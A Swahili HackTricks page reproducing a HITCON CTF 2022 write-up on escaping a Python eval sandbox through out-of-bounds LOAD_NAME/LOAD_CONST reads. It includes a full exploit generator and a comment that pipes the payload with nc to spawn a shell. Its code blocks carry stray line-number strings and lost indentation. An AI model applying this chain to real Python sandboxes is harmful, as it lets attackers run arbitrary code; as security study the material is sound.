# Kusoma LOAD_NAME / LOAD_CONST opcode OOB

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

**Taarifa hii imetolewa** [**kutoka kwenye andiko hili**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Tunaweza kutumia kipengele cha OOB read katika opcode ya LOAD_NAME / LOAD_CONST ili kupata alama fulani kwenye kumbukumbu. Hii inamaanisha kutumia hila kama `(a, b, c, ... mamia ya alama ..., __getattribute__) if [] else [].__getattribute__(...)` ili kupata alama (kama jina la kazi) unayotaka.

Kisha tuandae shambulio letu.

### Muhtasari <a href="#overview-1" id="overview-1"></a>

Msimbo wa chanzo ni mfupi sana, una mstari wa 4 tu!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Unaweza kuingiza nambari yoyote ya Python, na itaandaliwa kuwa [kitu cha nambari ya Python](https://docs.python.org/3/c-api/code.html). Hata hivyo, `co_consts` na `co_names` ya kitu hicho cha nambari zitabadilishwa na kufanywa kuwa tupu kabla ya kutekeleza kitu hicho cha nambari.

Kwa njia hii, matokeo yote yanayohusisha vitu (kama vile nambari, herufi n.k.) au majina (kama vile mabadiliko, kazi) yanaweza kusababisha kosa la kugawanyika mwishoni.

### Kusoma Nje ya Kikomo <a href="#kusoma-nje-ya-kikomo" id="kusoma-nje-ya-kikomo"></a>

Kosa la kugawanyika linatokea vipi?

Tuanze na mfano rahisi, `[a, b, c]` inaweza kuandaliwa kuwa nambari ya chini ifuatayo.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Lakini ikiwa `co_names` inakuwa tuple tupu? OPCODE ya `LOAD_NAME 2` bado inatekelezwa, na jaribu kusoma thamani kutoka kwa anwani ya kumbukumbu ambayo awali ilikuwa. Ndiyo, hii ni "vipengele" vya kusoma nje ya mipaka.

Wazo kuu la suluhisho ni rahisi. Baadhi ya OPCODES katika CPython kama vile `LOAD_NAME` na `LOAD_CONST` ni hatari (?) kwa kusoma nje ya mipaka.

Hizi hupata kitu kutoka kwa index `oparg` kutoka kwa tuple za `consts` au `names` (ndio maana `co_consts` na `co_names` zinaitwa chini ya pazia). Tunaweza kutaja snippest fupi ifuatayo kuhusu `LOAD_CONST` kuona CPython inafanya nini wakati inapoprosesia OPCODE ya `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Kwa njia hii tunaweza kutumia kipengele cha OOB kupata "jina" kutoka kumbukumbu isiyojulikana. Ili kuhakikisha jina lina nini na ni kumbukumbu gani, jaribu tu `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Na unaweza kupata kitu kwenye oparg > 700. Unaweza pia jaribu kutumia gdb kuangalia muundo wa kumbukumbu, lakini sidhani itakuwa rahisi zaidi?

### Kuzalisha Shambulizi <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Marafiki tunapopata vipengele muhimu kwa majina / consts, _je_ tunapata jina / const kutoka kwa kumbukumbu hiyo na kuitumia? Hapa kuna hila kwako:\
Tufikirie tunaweza kupata jina la `__getattribute__` kutoka kumbukumbu ya 5 (`LOAD_NAME 5`) na `co_names=()`, basi fanya mambo yafuatayo:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Tafadhali kumbuka kwamba siyo lazima kuita hii kama `__getattribute__`, unaweza kuita kwa jina fupi au la kushangaza zaidi.

Unaweza kuelewa sababu nyuma yake kwa kuangalia bytecode yake:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Tambua kuwa `LOAD_ATTR` pia inapata jina kutoka `co_names`. Python inapakia majina kutoka kwa offset sawa ikiwa jina ni sawa, kwa hivyo `__getattribute__` ya pili bado inapakia kutoka offset=5. Kwa kutumia kipengele hiki, tunaweza kutumia jina lolote tunapotumia jina hilo karibu na kumbukumbu.

Kwa kuzalisha nambari, inapaswa kuwa rahisi:

* 0: sio \[\[]]
* 1: sio \[]
* 2: (sio \[]) + (sio \[])
* ...

### Skripti ya Udukuzi <a href="#exploit-script-1" id="exploit-script-1"></a>

Sikutumia consts kwa sababu ya kikomo cha urefu.

Kwanza hapa kuna skripti ili tuweze kupata hizo offset za majina.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Na yafuatayo ni kwa ajili ya kuzalisha shambulio halisi la Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Inafanya mambo yafuatayo, kwa hizo herufi tunazipata kutoka kwa njia ya `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
